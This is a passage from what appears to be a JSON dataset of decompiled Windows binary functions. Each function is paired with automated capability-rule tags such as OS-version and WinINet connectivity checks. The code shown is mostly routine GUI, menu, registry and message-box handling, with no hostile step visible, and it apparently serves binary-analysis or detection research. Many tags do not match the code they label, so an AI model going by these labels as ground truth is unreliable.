0xf0) == 0) && ((uVar2 = param_2 & 0xf,  uVar2 < 2 || ((2 < uVar2 && (uVar2 < 5)))))) {\n        param_2 = param_2 | 0x30;\n    }\n    auStack268[0] = 0;\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, &stack0xfffffef4, 0x104);\n    if (iVar3 == 0x104) {\n        uStack9 = 0;\n    }\n    (*_sym.imp.USER32.dll_MessageBoxA)(iVar4, param_1, &stack0xfffffef4, param_2);\n    if (piVar1 != NULL) {\n        *piVar1 = iStack276;\n    }\n    if (iStack272 != 0) {\n        (*_sym.imp.USER32.dll_EnableWindow)(iStack272, 1);\n    }\n    fcn.004339d9(1);\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 649
    },
    "00433d52": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00433d52(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    \n    iVar1 = arg_8h;\n    fcn.0042eba6(arg_8h, &arg_8h);\n    if (arg_8h == 0) {\n        iVar2 = fcn.0042eb6f(iVar1);\n        if (iVar2 == 0) {\n            fcn.00429bca();\n        }\n    }\n    *(in_ECX + 0xc) = 0;\n    *(in_ECX + 8) = iVar1;\n    return arg_8h;\n}\n",
        "token_count": 159
    },
    "00433d91": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00433d91(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = arg_10h;\n    if (*(arg_10h + 0x1c) != 0) {\n        return;\n    }\n    iVar1 = fcn.0042eb4d();\n    if (iVar1 != 0) {\n        return;\n    }\n    fcn.00433d52(arg_ch);\n    fcn.0042eba6(arg_ch, &arg_10h);\n    if (arg_10h != 0) {\n        iVar1 = fcn.0042d668(arg_10h);\n        if (iVar1 == 0) {\n            fcn.00429bca();\n        }\n        if (arg_10h != 0) {\n            iVar1 = *(arg_8h + 4);\n            iVar2 = (*_sym.imp.USER32.dll_GetParent)(*(iVar2 + 0x1c));\n            if (*(iVar1 + 0x1c) == iVar2) {\n                return;\n            }\n            arg_ch = 0;\n            goto code_r0x00433e0c;\n        }\n    }\n    iVar2 = fcn.0042eb6f(arg_ch);\n    if (iVar2 == 0) {\n        return;\n    }\n    iVar1 = *(arg_8h + 4);\ncode_r0x00433e0c:\n    fcn.0042ed9e(iVar1, arg_ch);\n    return;\n}\n",
        "token_count": 352
    },
    "00433eea": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00433eea(uint lpAppName, uint lpValueName, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint lpString;\n    uint var_4h;\n    \n    var_4h = *0x44d270;\n    if (*(in_ECX + 0x50) == 0) {\n        (*_sym.imp.USER32.dll_wsprintfA)(&lpString, 0x4403cc, arg_10h);\n        (*_sym.imp.KERNEL32.dll_WritePrivateProfileStringA)(lpAppName, lpValueName, &lpString, *(in_ECX + 100));\n    }\n    else {\n        iVar1 = fcn.00439188(lpAppName);\n        if (iVar1 != 0) {\n            (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(iVar1, lpValueName, 0, 4, &arg_10h, 4);\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(iVar1);\n        }\n    }\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 244
    },
    "004343a6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004343a6(int32_t *arg_8h, uint8_t *arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint8_t *puVar5;\n    \n    iVar4 = 0;\n    uVar1 = *arg_ch;\n    puVar5 = arg_ch;\n    while (uVar1 != 0) {\n        if (*puVar5 == 0x25) {\n            uVar1 = puVar5[1];\n            if ((uVar1 < '1') || ('9' < uVar1)) {\n                if ((uVar1 < 'A') || ('Z' < uVar1)) goto code_r0x004343ff;\n                if (uVar1 < ':') goto code_r0x004343dd;\n                iVar3 = uVar1 + -0x38;\n            }\n            else {\ncode_r0x004343dd:\n                iVar3 = uVar1 + -0x31;\n            }\n            puVar5 = puVar5 + 2;\n            if (arg_14h <= iVar3) goto code_r0x0043440e;\n            iVar3 = *(arg_10h + iVar3 * 4);\n            if (iVar3 != 0) {\n                iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(iVar3);\n                iVar4 = iVar4 + iVar3;\n            }\n        }\n        else {\ncode_r0x004343ff:\n            if ((*(*puVar5 + 0x452001) & 4) != 0) {\n                iVar4 = iVar4 + 1;\n                puVar5 = puVar5 + 1;\n            }\n            puVar5 = puVar5 + 1;\ncode_r0x0043440e:\n            iVar4 = iVar4 + 1;\n        }\n        uVar1 = *puVar5;\n    }\n    puVar5 = fcn.00402110(iVar4);\n    do {\n        while( true ) {\n            if (*arg_ch == 0) {\n                fcn.0040f065(puVar5 - *arg_8h);\n                return;\n            }\n            uVar1 = *arg_ch;\n            if (uVar1 == 0x25) break;\ncode_r0x00434479:\n            if ((*(uVar1 + 0x452001) & 4) != 0) {\n                *puVar5 = uVar1;\n                puVar5 = puVar5 + 1;\n                arg_ch = arg_ch + 1;\n            }\n            *puVar5 = *arg_ch;\n            puVar5 = puVar5 + 1;\n            arg_ch = arg_ch + 1;\n        }\n        uVar2 = arg_ch[1];\n        if ((uVar2 < '1') || ('9' < uVar2)) {\n            if ((uVar2 < 'A') || ('Z' < uVar2)) goto code_r0x00434479;\n            if (uVar2 < ':') goto code_r0x00434449;\n            iVar4 = uVar2 + -0x38;\n        }\n        else {\ncode_r0x00434449:\n            iVar4 = uVar2 + -0x31;\n        }\n        arg_ch = arg_ch + 2;\n        if (iVar4 < arg_14h) {\n            iVar4 = *(arg_10h + iVar4 * 4);\n            if (iVar4 != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyA)(puVar5, iVar4);\n                iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(puVar5);\n                puVar5 = puVar5 + iVar4;\n            }\n        }\n        else {\n            *puVar5 = 0x3f;\n            puVar5 = puVar5 + 1;\n        }\n    } while( true );\n}\n",
        "token_count": 882
    },
    "00434785": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004347e1)\n// WARNING: Removing unreachable block (ram,0x004347ed)\n\nvoid fcn.00434785(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t unaff_EBX;\n    \n    uVar3 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n    pcVar1 = _sym.imp.USER32.dll_GetWindow;\n    iVar4 = (*_sym.imp.USER32.dll_GetWindow)(uVar3);\n    pcVar2 = _sym.imp.USER32.dll_ShowWindow;\n    for (; iVar4 != 0; iVar4 = (*pcVar1)(iVar4, 2)) {\n        iVar5 = fcn.0042cb28(iVar4);\n        if ((((iVar5 != 0) && (*0x21 != iVar4)) && (iVar6 = fcn.004345e7(*0x21, iVar4),  iVar6 != 0)) &&\n           (((uVar7 = (*_sym.imp.USER32.dll_GetWindowLongA)(iVar4, 0xfffffff0),  (uVar7 & 0x18000000) == 0 &&\n             ((*(iVar5 + 0x38) & 2) != 0)) && (*(unaff_EBX + 0xb0) == 0)))) {\n            (*pcVar2)(iVar4, 4);\n            *(iVar5 + 0x38) = *(iVar5 + 0x38) & 0xfffffffd;\n        }\n    }\n    return;\n}\n",
        "token_count": 374
    },
    "00434982": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00434982(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (**(*param_1 + 0x158))();\n    if (iVar1 != 0) {\n        return param_1[0x24];\n    }\n    if ((param_1[0x22] != 0) && (*(param_1[0x22] + 0x90) != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 116
    },
    "00434d0a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00434d0a(uint arg_8h, uint lpIconName)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_ECX;\n    uint var_58h;\n    uint var_38h;\n    int32_t lpClassName;\n    uint lpWndClass;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    iVar1 = fcn.00438818();\n    iVar1 = (*_sym.imp.USER32.dll_LoadIconA)(*(iVar1 + 0xc), lpIconName);\n    if (iVar1 != 0) {\n        fcn.004192e0(&var_58h, 0, 0x30);\n        var_38h = arg_8h;\n        (**(*in_ECX + 100))(&var_58h);\n        if (lpClassName != 0) {\n            iVar2 = fcn.00438818();\n            iVar2 = (*_sym.imp.USER32.dll_GetClassInfoA)(*(iVar2 + 8), lpClassName, &lpWndClass);\n            if ((iVar2 != 0) && (var_14h != iVar1)) {\n                uVar3 = fcn.0042c223(lpWndClass, var_10h, var_ch, iVar1);\n                return uVar3;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 316
    },
    "00434d8d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00434d8d(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t *var_4h;\n    \n    var_4h = param_1;\n    if (param_1[0x2c] != NULL) {\n        (*param_1[0x2c])(param_1);\n    }\n    piVar1 = (**(*param_1 + 0x138))();\n    if ((piVar1 != NULL) && (iVar2 = (**(*piVar1 + 0x8c))(param_1),  iVar2 == 0)) {\n        return;\n    }\n    iVar2 = fcn.00438818();\n    piVar3 = *(iVar2 + 4);\n    if ((piVar3 != NULL) && (piVar3[7] == param_1)) {\n        if ((piVar1 == NULL) && (iVar2 = (**(*piVar3 + 0x94))(),  iVar2 == 0)) {\n            return;\n        }\n        fcn.00433965();\n        fcn.00433920();\n        iVar2 = fcn.00436f8c();\n        if (iVar2 == 0) {\n            fcn.00436fac(0);\n            return;\n        }\n        iVar2 = fcn.00438818();\n        if ((*(iVar2 + 0x14) == '\\0') && (piVar3[7] == 0)) {\n            fcn.0043b077(0);\n            return;\n        }\n    }\n    if ((piVar1 != NULL) && (piVar1[0x12] != 0)) {\n        var_4h = (**(*piVar1 + 0x60))();\n        do {\n            if (var_4h == NULL) {\n                (**(*piVar1 + 0x7c))();\n                return;\n            }\n            (**(*piVar1 + 100))(&var_4h);\n            piVar3 = fcn.0042d465();\n        } while (piVar3 == param_1);\n        (**(*piVar1 + 0x94))(param_1);\n    }\n    (**(*param_1 + 0x60))();\n    return;\n}\n",
        "token_count": 508
    },
    "00434fee": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00434fee(int32_t arg_8h, int32_t *arg_ch, int32_t arg_10h)\n\n{\n    bool bVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    int32_t *in_ECX;\n    \n    fcn.0042ca5e();\n    uVar2 = fcn.0042ebfd();\n    piVar3 = in_ECX;\n    if ((uVar2 & 0x40000000) == 0) {\n        piVar3 = fcn.0042d4a4();\n    }\n    if (arg_8h != 0) {\n        arg_ch = in_ECX;\n    }\n    if ((piVar3 == arg_ch) ||\n       ((piVar4 = fcn.0042d4a4(),  piVar3 == piVar4 &&\n        (iVar5 = (*_sym.imp.USER32.dll_SendMessageA)(arg_ch[7], 0x36d, 0x40, 0),  iVar5 != 0)))) {\n        bVar1 = true;\n    }\n    else {\n        bVar1 = false;\n    }\n    piVar3[0xe] = piVar3[0xe] & 0xffffffdf;\n    if (bVar1) {\n        piVar3[0xe] = piVar3[0xe] | 0x20;\n    }\n    fcn.00434b7c(!bVar1 * '\\x04' + '\\x04');\n    piVar3 = in_ECX[0x2b];\n    if (piVar3 == NULL) {\n        iVar5 = (**(*in_ECX + 0x13c))();\n        piVar3 = *(iVar5 + 0xac);\n        if (piVar3 == NULL) {\n            return;\n        }\n    }\n    if ((arg_8h != 0) && (arg_10h == 0)) {\n        (**(*piVar3 + 0x15c))(1, piVar3, piVar3);\n    }\n    (**(*piVar3 + 0x160))(arg_8h);\n    return;\n}\n",
        "token_count": 489
    },
    "00435240": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00435240(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    int16_t iVar5;\n    int32_t in_ECX;\n    uint var_10ch;\n    uint var_108h;\n    uint var_4h;\n    \n    var_4h = *0x44d270;\n    uVar4 = fcn.00438818();\n    pcVar2 = _sym.imp.KERNEL32.dll_GlobalGetAtomNameA;\n    iVar1 = *(uVar4 + 4);\n    if ((((iVar1 != 0) && (arg_ch != 0)) && (iVar5 = arg_ch >> 0x10,  iVar5 != 0)) &&\n       ((arg_ch == *(iVar1 + 0x8c) && (iVar5 == *(iVar1 + 0x8e))))) {\n        (*_sym.imp.KERNEL32.dll_GlobalGetAtomNameA)(uVar4 & 0xffff0000 | *(iVar1 + 0x8c), &var_108h, 0x103);\n        pcVar3 = _sym.imp.KERNEL32.dll_GlobalAddAtomA;\n        (*_sym.imp.KERNEL32.dll_GlobalAddAtomA)(&var_108h);\n        (*pcVar2)(*(iVar1 + 0x8e), &var_108h, 0x103);\n        (*pcVar3)(&var_108h);\n        (*_sym.imp.USER32.dll_SendMessageA)(arg_8h, 0x3e4, *(in_ECX + 0x1c), *(iVar1 + 0x8c));\n    }\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 393
    },
    "004353e1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004353e1(int32_t *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    \n    piVar1 = fcn.0043496e();\n    if (arg_10h == 0) {\n        fcn.0042ee21(0, 0, 0, 0, 0, (-(arg_ch != 0) & 0xffffffc0) + 0x80 | 0x17);\n        (**(*arg_8h + 0x14c))(arg_ch);\n        if ((arg_ch != 0) || (iVar2 = fcn.00434982(),  iVar2 == 0)) {\n            (**(*piVar1 + 0x144))(0);\n        }\n    }\n    else {\n        (**(*arg_8h + 0x14c))(arg_ch);\n        piVar1[0x33] = piVar1[0x33] | 0xc;\n    }\n    iVar2 = fcn.00434982();\n    if (iVar2 == 0) {\n        return;\n    }\n    if (arg_8h[0x22] == NULL) {\n        uVar3 = arg_ch != 0;\n    }\n    else {\n        uVar3 = (**(*arg_8h[0x22] + 0x168))();\n    }\n    if (uVar3 == 1) {\n        if (arg_ch != 0) {\n            piVar1[0x27] = -1;\n            if (arg_10h == 0) {\n                uVar4 = 8;\n                goto code_r0x004354a4;\n            }\n            piVar1[0x27] = 8;\n            goto code_r0x004354cd;\n        }\n    }\n    else if (uVar3 == 0) {\n        piVar1[0x27] = -1;\n        if (arg_10h != 0) {\n            piVar1[0x27] = 0;\n            return;\n        }\n        uVar4 = 0;\ncode_r0x004354a4:\n        fcn.0042ecd5(uVar4);\n        return;\n    }\n    if (arg_10h != 0) {\n        return;\n    }\ncode_r0x004354cd:\n    (**(*piVar1 + 0x144))(0);\n    return;\n}\n",
        "token_count": 558
    },
    "004354dd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004354dd(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t in_ECX;\n    int32_t iVar7;\n    uint arg_ch_00;\n    int32_t iVar8;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.004335ef(*(in_ECX + 0x1c));\n    if ((arg_10h == 0) &&\n       ((*(in_ECX + 0x7c) == 0 || (iVar2 = (**(**(in_ECX + 0x7c) + 0x74))(arg_8h, arg_ch, 0),  iVar2 == 0)))) {\n        fcn.0042f5ae();\n        iVar2 = fcn.00438808();\n        pcVar1 = _sym.imp.USER32.dll_GetMenu;\n        if ((*(iVar2 + 0x78) != *(arg_8h + 4)) &&\n           (((iVar2 = (*_sym.imp.USER32.dll_GetMenu)(*(in_ECX + 0x1c)),  iVar2 != 0 &&\n             (iVar2 = fcn.0042d950(),  iVar2 != 0)) && (iVar2 = (*pcVar1)(*(iVar2 + 0x1c)),  iVar2 != 0)))) {\n            iVar3 = (*_sym.imp.USER32.dll_GetMenuItemCount)(iVar2);\n            iVar7 = 0;\n            if (0 < iVar3) {\n                do {\n                    iVar8 = iVar7;\n                    iVar4 = (*_sym.imp.USER32.dll_GetSubMenu)(iVar2, iVar7);\n                    if (iVar4 == *(arg_8h + 4)) {\n                        fcn.0043015e(iVar8, iVar2);\n                        break;\n                    }\n                    iVar7 = iVar7 + 1;\n                } while (iVar7 < iVar3);\n            }\n        }\n        var_ch = (*_sym.imp.USER32.dll_GetMenuItemCount)(*(arg_8h + 4));\n        pcVar1 = _sym.imp.USER32.dll_GetMenuItemID;\n        var_24h = 0;\n        if (var_ch != 0) {\n            do {\n                uVar6 = var_24h;\n                var_28h = (*pcVar1)(*(arg_8h + 4), var_24h);\n                uVar5 = var_ch;\n                if (var_28h != 0) {\n                    if (var_28h == 0xffffffff) {\n                        iVar2 = fcn.0040dac0(uVar6, var_24h);\n                        if (((iVar2 == 0) || (var_28h = (*pcVar1)(*(iVar2 + 4), 0),  var_28h == 0)) ||\n                           (var_28h == 0xffffffff)) goto code_r0x00435641;\n                        arg_ch_00 = 0;\n                    }\n                    else if ((*(in_ECX + 0x50) == 0) || (0xefff < var_28h)) {\n                        arg_ch_00 = 0;\n                    }\n                    else {\n                        arg_ch_00 = 1;\n                    }\n                    fcn.0042f5d4(in_ECX, arg_ch_00);\n                    uVar5 = (*_sym.imp.USER32.dll_GetMenuItemCount)(*(arg_8h + 4));\n                    if (uVar5 < var_ch) {\n                        var_24h = var_24h + (uVar5 - var_ch);\n                        while ((var_24h < uVar5 && (uVar6 = (*pcVar1)(*(arg_8h + 4), var_24h),  uVar6 == var_28h))) {\n                            var_24h = var_24h + 1;\n                        }\n                    }\n                }\ncode_r0x00435641:\n                var_ch = uVar5;\n                var_24h = var_24h + 1;\n            } while (var_24h < var_ch);\n        }\n    }\n    return;\n}\n",
        "token_count": 985
    },
    "00435657": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00435657(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_ECX;\n    \n    iVar1 = fcn.0042d4a4();\n    if ((in_ECX[0x1f] != NULL) && (iVar2 = (**(*in_ECX[0x1f] + 0x7c))(arg_8h, arg_ch, arg_10h),  iVar2 != 0)) {\n        return;\n    }\n    if (arg_ch == 0xffff) {\n        in_ECX[0xe] = in_ECX[0xe] & 0xffffffbf;\n        if (*(iVar1 + 100) == 0) {\n            in_ECX[0x29] = 0xe001;\n        }\n        else {\n            in_ECX[0x29] = 0xe002;\n        }\n        (*_sym.imp.USER32.dll_SendMessageA)(in_ECX[7], 0x362, in_ECX[0x29], 0);\n        iVar1 = (**(*in_ECX + 0x150))();\n        if (iVar1 != 0) {\n            (*_sym.imp.USER32.dll_UpdateWindow)(*(iVar1 + 0x1c));\n        }\n        goto code_r0x0043572e;\n    }\n    if ((arg_8h == 0) || ((arg_ch & 0x810) != 0)) {\n        in_ECX[0x29] = 0;\n    }\n    else {\n        if ((arg_8h < 0xf000) || (0xf1ef < arg_8h)) {\n            if (0xfeff < arg_8h) {\n                in_ECX[0x29] = 0xef1f;\n                goto code_r0x0043572a;\n            }\n        }\n        else {\n            arg_8h = (arg_8h - 0xf000 >> 4) + 0xef00;\n        }\n        in_ECX[0x29] = arg_8h;\n    }\ncode_r0x0043572a:\n    *(iVar1 + 0x38) = *(iVar1 + 0x38) | 0x40;\ncode_r0x0043572e:\n    if (in_ECX[0x29] != in_ECX[0x2a]) {\n        uVar3 = (*_sym.imp.USER32.dll_GetParent)(in_ECX[7]);\n        iVar1 = fcn.0042cb01(uVar3);\n        if (iVar1 != 0) {\n            (*_sym.imp.USER32.dll_PostMessageA)(in_ECX[7], 0x36a, 0, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 631
    },
    "004357b2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_48h\n\nvoid fcn.004357b2(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t **ppiVar3;\n    int32_t *piVar4;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *puVar5;\n    int32_t *unaff_EDI;\n    uint *in_FS_OFFSET;\n    int32_t iStack80;\n    int32_t *var_48h;\n    uint var_44h;\n    uint uStack68;\n    uint var_2ch;\n    uint var_28h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    uStack68 = 10;\n    var_44h = 0x4357cc;\n    fcn.0042a286();\n    *(unaff_EBP + -4) = 0;\n    var_44h = 10;\n    var_48h = 0x4357da;\n    fcn.0042a286();\n    iVar1 = *(extraout_ECX + 0x84);\n    *(unaff_EBP + -4) = 1;\n    *(unaff_EBP + -0x10) = iVar1;\n    var_48h = unaff_EDI;\n    while (iVar1 != 0) {\n        iStack80 = unaff_EBP + -0x10;\n        ppiVar3 = fcn.0040e765();\n        piVar4 = *ppiVar3;\n        (**(*piVar4 + 0x158))();\n        iStack80 = 0x435819;\n        var_48h = piVar4;\n        fcn.0042a334();\n        iVar1 = *(unaff_EBP + -0x10);\n    }\n    puVar5 = *(unaff_EBP + -0x44);\n    while (puVar5 != NULL) {\n        if (puVar5 == NULL) goto code_r0x00429be4;\n        ppiVar3 = puVar5 + 2;\n        puVar5 = *puVar5;\n        if ((*ppiVar3)[0x24] == 0) {\n            var_48h = 0x43584c;\n            (**(**ppiVar3 + 0x60))();\n        }\n        else {\n            var_48h = 0x43583e;\n            piVar4 = fcn.0042d465();\n            var_48h = 0x435845;\n            (**(*piVar4 + 0x60))();\n        }\n    }\n    puVar5 = *(unaff_EBP + -0x28);\n    while( true ) {\n        if (puVar5 == NULL) {\n            *(unaff_EBP + -4) = 0;\n            var_48h = 0x435879;\n            fcn.0042a2a9();\n            *(unaff_EBP + -4) = 0xffffffff;\n            var_48h = 0x435885;\n            fcn.0042a2a9();\n            *in_FS_OFFSET = *(unaff_EBP + -0xc);\n            return;\n        }\n        if (puVar5 == NULL) break;\n        ppiVar3 = puVar5 + 2;\n        puVar5 = *puVar5;\n        if (*ppiVar3 != NULL) {\n            var_48h = 0x435869;\n            (**(**ppiVar3 + 0x60))();\n        }\n    }\ncode_r0x00429be4:\n    iStack80 = 0x4503b0;\n    fcn.004187b8(&stack0xffffffb0, 0x4479fc);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 850
    },
    "00435897": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00435897(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    int32_t var_4h;\n    \n    if (arg_8h == 0) {\n        iVar1 = 0;\n    }\n    else {\n        var_4h = *(in_ECX + 0x84);\n        do {\n            if (var_4h == 0) {\n                return 0;\n            }\n            piVar2 = fcn.0040e765(&var_4h);\n            iVar1 = *piVar2;\n            uVar3 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(*(iVar1 + 0x1c));\n        } while ((uVar3 & 0xffff) != arg_8h);\n    }\n    return iVar1;\n}\n",
        "token_count": 205
    },
    "00436dba": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00436dba(uint *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    uVar4 = *0x450484;\n    uVar3 = *0x450480;\n    if (in_ECX != NULL) {\n        iVar2 = (*_sym.imp.GDI32.dll_GetMapMode)(in_ECX[2]);\n        pcVar1 = _sym.imp.GDI32.dll_GetDeviceCaps;\n        if ((iVar2 < 7) && (iVar2 != 1)) {\n            (**(*in_ECX + 0x34))(3);\n            fcn.0043247d(arg_8h);\n            (**(*in_ECX + 0x34))(iVar2);\n            return;\n        }\n        uVar3 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(in_ECX[2], 0x58);\n        uVar4 = (*pcVar1)(in_ECX[2], 0x5a);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_MulDiv;\n    uVar3 = (*_sym.imp.KERNEL32.dll_MulDiv)(*arg_8h, 0x9ec, uVar3);\n    *arg_8h = uVar3;\n    uVar4 = (*pcVar1)(arg_8h[1], 0x9ec, uVar4);\n    arg_8h[1] = uVar4;\n    return;\n}\n",
        "token_count": 351
    },
    "00436e48": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
